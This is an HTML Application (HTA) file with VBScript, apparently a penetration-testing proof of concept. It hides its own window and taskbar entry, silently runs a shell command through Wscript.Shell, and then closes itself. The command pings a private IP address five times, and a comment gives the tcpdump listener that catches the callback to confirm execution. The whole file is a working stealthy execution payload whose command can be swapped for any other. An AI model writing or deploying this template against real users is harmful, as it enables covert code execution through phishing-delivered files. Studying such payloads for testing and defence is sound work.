<!DOCTYPE html>
<html>
  <head>
    <HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
    <script language="VBScript">
      Function var_func()
      Dim var_shell
      Set var_shell = CreateObject("Wscript.Shell")
      // sudo tcpdump -i any -n -l icmp
      var_shell.run "ping -n 5 192.168.45.246", 0, true
      End Function
      var_func
      self.close
    </script>
  </head>
  <body></body>
</html>
